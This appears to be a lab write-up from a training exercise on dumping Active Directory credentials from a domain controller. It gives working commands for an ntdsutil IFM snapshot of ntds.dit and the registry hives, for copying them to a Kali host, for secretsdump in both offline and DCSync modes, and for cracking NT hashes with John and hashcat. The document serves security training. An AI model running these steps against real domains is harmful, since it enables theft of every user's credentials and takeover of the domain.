# LAB — Extracting Credentials From the Domain Controller

> [!abstract] TL;DR
> The **NTDS.dit** database (`C:\Windows\NTDS\ntds.dit`) holds **all domain users' hashes/keys**. It's encrypted and locked while AD runs; decryption needs the domain **boot key** from the **SECURITY** hive (plus **SYSTEM**). Two approaches (both need admin on the DC):
> - **Local, no creds:** `ntdsutil` IFM snapshot → copy `ntds.dit` + `SYSTEM` + `SECURITY` → `secretsdump ... LOCAL`
> - **Remote, with creds (DCSync):** `impacket-secretsdump -just-dc DOMAIN/admin@DC_IP` — uses DRSUAPI replication, no file copying.

---

## NTDS — The Domain Database

**New Technologies Directory Services (NTDS)** is a database containing all Active Directory data (objects, attributes, credentials). `NTDS.dit` has three tables:

- **Schema table** — types of objects and their relationships
- **Link table** — object attributes and their values
- **Data table** — users and groups

Like SAM, `ntds.dit` is **encrypted** and **locked/in-use** while AD runs, so you can't copy it directly. Unlike SAM, it **cannot** be decrypted with the SYSTEM hive alone — it requires the domain-wide **boot key** stored in the **SECURITY** hive (used to decrypt LSA Isolated credentials).

> [!info] Three files required for offline extraction
> | File | Location | Role |
> |---|---|---|
> | `ntds.dit` | `C:\Windows\NTDS\ntds.dit` | The AD database |
> | `SYSTEM` | `C:\Windows\System32\config\SYSTEM` | Part of the decryption key |
> | `SECURITY` | `C:\Windows\System32\config\SECURITY` | Domain-wide boot key |

### `ntdsutil`

Native Windows utility to manage/maintain AD config. Use cases: restore deleted AD objects, DB maintenance, AD snapshot management, set DSRM admin passwords. ([Microsoft docs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)))

## Approach 1 — Local Dumping (No Credentials)

Used when you have **no credentials but have administrator access to the DC**. You dump the files with Windows utilities and crack offline. `ntdsutil` uses the **IFM (Install From Media)** subsystem to create an offline snapshot (Volume Shadow Copy), bypassing the file lock.

### Dump NTDS with the `ntdsutil` one-liner

```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

- **`ac i ntds`** — activate instance NTDS (target database)
- **`ifm`** — enter the Install From Media menu
- **`create full c:\temp`** — generate a full snapshot/shadow copy into `C:\temp`
- **`q q`** — quit the submenus sequentially to exit automatically

Verify the output:

```
cd c:\temp
dir
```

`C:\temp` now contains two folders:

1. **`Active Directory`** — holds **`ntds.dit`**
2. **`registry`** — holds the **`SYSTEM`** and **`SECURITY`** hives

### Transfer to Kali (SCP)

Kali:

```bash
sudo systemctl start ssh
```

Windows PowerShell (copy directories recursively):

```
scp -r "C:\temp\Active Directory" kali@192.168.163.199:/home/kali/Downloads/
scp -r "C:\temp\registry" kali@192.168.163.199:/home/kali/Downloads/
```

### Decrypt offline with `secretsdump`

```
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local
```

- **`-system`** — path to the SYSTEM hive
- **`-security`** — path to the SECURITY hive (boot key)
- **`-ntds`** — path to `ntds.dit`
- **`local`** / **`LOCAL`** — offline local parsing (no network connection)

## Approach 2 — Remote Dumping (With Credentials) / DCSync

Dump the DC hashes remotely without copying any files — requires credentials (password or NTLM hash) for a user with admin access to the DC, or special DCSync permissions.

### DCSync permissions

The attack works when a compromised account (admin, or a special account) has these AD permissions:

- **Replicating Directory Changes**
- **Replicating Directory Changes All**
- **Replicating Directory Changes in Filtered Set**

An adversary abuses these to perform domain replication ("DC Sync"). `secretsdump` uses the **DRSUAPI / Directory Replication Service (DRS) RPC** method — the same mechanism as DCSync — to request replication data remotely, and the DC streams all domain credentials back.

### Command

```
impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.49.178.221
```

- **`-just-dc`** — extract the NTDS data (hashes + Kerberos keys)
- **`THM.red/<AD_Admin_User>`** — authenticated domain user as `domain/user`

> [!note] `-just-dc` vs offline

> ```

> ```

## Cracking Hashes

In standard Windows pentesting, cracking is often unnecessary — you can move laterally directly with **Pass-the-Hash**. But to recover a cleartext password:

### John the Ripper (NT format)

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=nt

Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd123      (?)
1g 0:00:00:00 DONE (2026-10-14 07:57) 4.347g/s 9145Kp/s 9145Kc/s 9145KC/s Paul22..Paris13
Use the "--show --format=NT" options to display all of the cracked passwords reliably

```

> [!tip] An initial run without `--format=NT` fails — John needs the explicit hash algorithm.

### Hashcat (NTLM, mode 1000)

```
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/rockyou.txt
```
